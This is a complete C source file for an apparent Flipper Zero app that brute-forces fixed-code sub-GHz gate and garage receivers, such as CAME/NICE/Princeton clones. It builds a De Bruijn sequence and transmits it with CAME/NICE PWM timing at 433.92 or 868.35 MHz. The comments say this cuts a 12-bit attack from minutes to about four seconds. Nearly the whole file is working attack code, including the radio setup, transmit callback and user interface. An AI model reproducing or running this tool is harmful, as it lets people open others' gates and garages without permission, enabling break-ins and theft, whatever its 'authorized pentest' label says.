// SubGHz De Bruijn brute — authorized pentest tool.
//
// Transmits a De Bruijn sequence B(2,n) so that EVERY n-bit fixed code
// appears once as a sliding window — no per-code preamble/gap/repeats.
// For CAME/NICE 12-bit this turns a ~5-minute framed brute into ~4 sec.
//
// Works on sliding-window / shift-register fixed-code receivers (most
// cheap CAME/NICE/Princeton clones). Receivers that strictly require a
// guard gap before every code will not fully benefit — test on target.
//
// CAME/NICE 12-bit PWM encoding (te = 320us):
//   bit 1: HIGH te,    LOW  2*te
//   bit 0: HIGH 2*te,  LOW  te
// Each bit = 3*te = 960us. One initial guard (36*te low) per pass.

#include <furi.h>
#include <furi_hal.h>
#include <furi_hal_subghz.h>
#include <gui/gui.h>
#include <input/input.h>
#include <toolbox/level_duration.h>
#include <lib/subghz/devices/devices.h>
#include <lib/subghz/devices/cc1101_int/cc1101_int_interconnect.h>

#define TE_US 320

static const uint32_t FREQS[] = {433920000UL, 868350000UL};
static const char* FREQ_LABELS[] = {"433.92", "868.35"};
#define NUM_FREQS 2

static const int BITS_OPTS[] = {8, 10, 12};
#define NUM_BITS 3

static const int REPEAT_OPTS[] = {1, 2, 3};
#define NUM_REPEATS 3

typedef enum { FieldFreq, FieldBits, FieldRepeats, FieldCount } Field;
typedef enum { ScreenConfig, ScreenTx, ScreenDone } Screen;

// ---- De Bruijn generation (FKM algorithm, k=2) ----
typedef struct {
    uint8_t* seq;
    int n;
    int len;
    int a[20];
} DbCtx;

static void db_rec(DbCtx* c, int t, int p) {
    if(t > c->n) {
        if(c->n % p == 0) {
            for(int j = 1; j <= p; j++) c->seq[c->len++] = (uint8_t)c->a[j];
        }
    } else {
        c->a[t] = c->a[t - p];
        db_rec(c, t + 1, p);
        for(int j = c->a[t - p] + 1; j <= 1; j++) { // k-1 = 1
            c->a[t] = j;
            db_rec(c, t + 1, t);
        }
    }
}

// ---- TX streaming state ----
typedef struct {
    uint8_t* seq;
    int total;     // 2^n + (n-1)
    int bi;
    int half;      // 0 = high, 1 = low
    int repeats;
    int rep_done;
    bool guard_done;
    uint32_t te;
} TxState;

static LevelDuration tx_callback(void* ctx) {
    TxState* s = ctx;
    if(!s->guard_done) {
        s->guard_done = true;
        return level_duration_make(false, s->te * 36);
    }
    if(s->bi >= s->total) {
        s->rep_done++;
        if(s->rep_done < s->repeats) {
            s->bi = 0;
            s->half = 0;
            return level_duration_make(false, s->te * 36);
        }
        return level_duration_reset();
    }
    uint8_t bit = s->seq[s->bi];
    if(s->half == 0) {
        s->half = 1;
        return level_duration_make(true, bit ? s->te : s->te * 2);
    } else {
        s->half = 0;
        s->bi++;
        return level_duration_make(false, bit ? s->te * 2 : s->te);
    }
}

typedef struct {
    FuriMutex* mutex;
    Screen screen;
    Field field;
    int freq_idx;
    int bits_idx;
    int repeats_idx;

    uint8_t* seq;
    TxState tx;

    uint32_t start_tick;
    uint32_t total_ms;
    bool tx_active;

    FuriThread* worker;
    volatile bool cancel;
} App;

static int32_t tx_thread(void* ctx) {
    App* app = ctx;
    int n = BITS_OPTS[app->bits_idx];
    int seqbits = 1 << n;          // 2^n
    int total = seqbits + (n - 1); // linear with wrap window

    app->seq = malloc(total + 4);
    if(!app->seq) {
        furi_mutex_acquire(app->mutex, FuriWaitForever);
        app->screen = ScreenDone;
        furi_mutex_release(app->mutex);
        return 0;
    }

    DbCtx db = {.seq = app->seq, .n = n, .len = 0};
    db_rec(&db, 1, 1);            // fills 2^n bits
    for(int i = 0; i < n - 1; i++) app->seq[seqbits + i] = app->seq[i]; // wrap

    app->tx.seq = app->seq;
    app->tx.total = total;
    app->tx.bi = 0;
    app->tx.half = 0;
    app->tx.repeats = REPEAT_OPTS[app->repeats_idx];
    app->tx.rep_done = 0;
    app->tx.guard_done = false;
    app->tx.te = TE_US;

    // airtime estimate (ms): repeats * (guard + total_bits * 3te)
    uint32_t per_pass = (uint32_t)(TE_US * 36) + (uint32_t)total * (TE_US * 3);
    app->total_ms = (per_pass / 1000) * REPEAT_OPTS[app->repeats_idx];
    app->start_tick = furi_get_tick();

    subghz_devices_init();
    const SubGhzDevice* dev = subghz_devices_get_by_name(SUBGHZ_DEVICE_CC1101_INT_NAME);
    subghz_devices_begin(dev);
    subghz_devices_reset(dev);
    subghz_devices_load_preset(dev, FuriHalSubGhzPresetOok650Async, NULL);
    subghz_devices_set_frequency(dev, FREQS[app->freq_idx]);

    if(subghz_devices_start_async_tx(dev, tx_callback, &app->tx)) {
        while(!subghz_devices_is_async_complete_tx(dev) && !app->cancel) {
            furi_delay_ms(20);
        }
        subghz_devices_stop_async_tx(dev);
    }

    subghz_devices_sleep(dev);
    subghz_devices_end(dev);
    subghz_devices_deinit();

    free(app->seq);
    app->seq = NULL;

    furi_mutex_acquire(app->mutex, FuriWaitForever);
    app->screen = ScreenDone;
    furi_mutex_release(app->mutex);
    return 0;
}

static void start_tx(App* app) {
    app->cancel = false;
    app->screen = ScreenTx;
    app->worker = furi_thread_alloc();
    furi_thread_set_name(app->worker, "DbTx");
    furi_thread_set_stack_size(app->worker, 2048);
    furi_thread_set_context(app->worker, app);
    furi_thread_set_callback(app->worker, tx_thread);
    furi_thread_start(app->worker);
}

static void stop_tx(App* app) {
    if(app->worker) {
        app->cancel = true;
        furi_thread_join(app->worker);
        furi_thread_free(app->worker);
        app->worker = NULL;
    }
}

static void draw_cb(Canvas* canvas, void* ctx) {
    App* app = ctx;
    furi_mutex_acquire(app->mutex, FuriWaitForever);
    canvas_clear(canvas);

    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 2, 10, "SubGHz DeBruijn");
    canvas_draw_line(canvas, 0, 13, 128, 13);
    canvas_set_font(canvas, FontSecondary);
    char buf[48];

    if(app->screen == ScreenConfig) {
        snprintf(buf, sizeof(buf), "%sFreq: %s MHz",
                 app->field == FieldFreq ? ">" : " ", FREQ_LABELS[app->freq_idx]);
        canvas_draw_str(canvas, 2, 26, buf);
        snprintf(buf, sizeof(buf), "%sBits: %d  (%d codes)",
                 app->field == FieldBits ? ">" : " ",
                 BITS_OPTS[app->bits_idx], 1 << BITS_OPTS[app->bits_idx]);
        canvas_draw_str(canvas, 2, 37, buf);
        snprintf(buf, sizeof(buf), "%sRepeats: %d",
                 app->field == FieldRepeats ? ">" : " ", REPEAT_OPTS[app->repeats_idx]);
        canvas_draw_str(canvas, 2, 48, buf);
        canvas_draw_str(canvas, 2, 62, "OK=TX U/D=val L/R=field");
    } else if(app->screen == ScreenTx) {
        canvas_draw_str_aligned(canvas, 64, 24, AlignCenter, AlignCenter,
                                "Transmitting...");
        uint32_t elapsed = furi_get_tick() - app->start_tick;
        int pct = app->total_ms > 0 ? (int)(elapsed * 100 / app->total_ms) : 0;
        if(pct > 100) pct = 100;
        canvas_draw_frame(canvas, 2, 32, 124, 8);
        canvas_draw_box(canvas, 3, 33, pct * 122 / 100, 6);
        snprintf(buf, sizeof(buf), "%d%%   %lu / %lu ms", pct,
                 (unsigned long)(elapsed > app->total_ms ? app->total_ms : elapsed),
                 (unsigned long)app->total_ms);
        canvas_draw_str_aligned(canvas, 64, 50, AlignCenter, AlignCenter, buf);
        canvas_draw_str_aligned(canvas, 64, 62, AlignCenter, AlignCenter, "Back = stop");
    } else {
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 64, 28, AlignCenter, AlignCenter, "Done");
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str_aligned(canvas, 64, 44, AlignCenter, AlignCenter,
                                "All codes transmitted");
        canvas_draw_str_aligned(canvas, 64, 58, AlignCenter, AlignCenter,
                                "Any key = back");
    }

    furi_mutex_release(app->mutex);
}

static void input_cb(InputEvent* e, void* ctx) {
    FuriMessageQueue* q = ctx;
    furi_message_queue_put(q, e, FuriWaitForever);
}

int32_t subghz_debruijn_app(void* p) {
    UNUSED(p);
    App* app = malloc(sizeof(App));
    memset(app, 0, sizeof(*app));
    app->mutex = furi_mutex_alloc(FuriMutexTypeNormal);
    app->screen = ScreenConfig;
    app->bits_idx = 2; // 12-bit default (CAME/NICE)
    app->repeats_idx = 1; // 2 passes

    FuriMessageQueue* q = furi_message_queue_alloc(8, sizeof(InputEvent));
    ViewPort* vp = view_port_alloc();
    view_port_draw_callback_set(vp, draw_cb, app);
    view_port_input_callback_set(vp, input_cb, q);
    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, vp, GuiLayerFullscreen);

    InputEvent e;
    bool running = true;
    uint32_t last_redraw = 0;

    while(running) {
        FuriStatus s = furi_message_queue_get(q, &e, 100);
        if(s == FuriStatusOk && (e.type == InputTypeShort || e.type == InputTypeRepeat)) {
            furi_mutex_acquire(app->mutex, FuriWaitForever);
            Screen scr = app->screen;
            furi_mutex_release(app->mutex);

            if(scr == ScreenConfig) {
                furi_mutex_acquire(app->mutex, FuriWaitForever);
                switch(e.key) {
                case InputKeyLeft:
                    if(app->field > 0) app->field--;
                    break;
                case InputKeyRight:
                    if(app->field < FieldCount - 1) app->field++;
                    break;
                case InputKeyUp:
                    if(app->field == FieldFreq && app->freq_idx < NUM_FREQS - 1) app->freq_idx++;
                    else if(app->field == FieldBits && app->bits_idx < NUM_BITS - 1) app->bits_idx++;
                    else if(app->field == FieldRepeats && app->repeats_idx < NUM_REPEATS - 1) app->repeats_idx++;
                    break;
                case InputKeyDown:
                    if(app->field == FieldFreq && app->freq_idx > 0) app->freq_idx--;
                    else if(app->field == FieldBits && app->bits_idx > 0) app->bits_idx--;
                    else if(app->field == FieldRepeats && app->repeats_idx > 0) app->repeats_idx--;
                    break;
                case InputKeyOk:
                    furi_mutex_release(app->mutex);
                    start_tx(app);
                    furi_mutex_acquire(app->mutex, FuriWaitForever);
                    break;
                case InputKeyBack:
                    running = false;
                    break;
                default:
                    break;
                }
                furi_mutex_release(app->mutex);
            } else if(scr == ScreenTx) {
                if(e.key == InputKeyBack) {
                    stop_tx(app);
                    furi_mutex_acquire(app->mutex, FuriWaitForever);
                    app->screen = ScreenConfig;
                    furi_mutex_release(app->mutex);
                }
            } else { // Done
                stop_tx(app);
                furi_mutex_acquire(app->mutex, FuriWaitForever);
                app->screen = ScreenConfig;
                furi_mutex_release(app->mutex);
            }
        }

        uint32_t now = furi_get_tick();
        if(now - last_redraw > 100) {
            view_port_update(vp);
            last_redraw = now;
        }
    }

    stop_tx(app);

    view_port_enabled_set(vp, false);
    gui_remove_view_port(gui, vp);
    view_port_free(vp);
    furi_message_queue_free(q);
    furi_mutex_free(app->mutex);
    furi_record_close(RECORD_GUI);
    free(app);
    return 0;
}
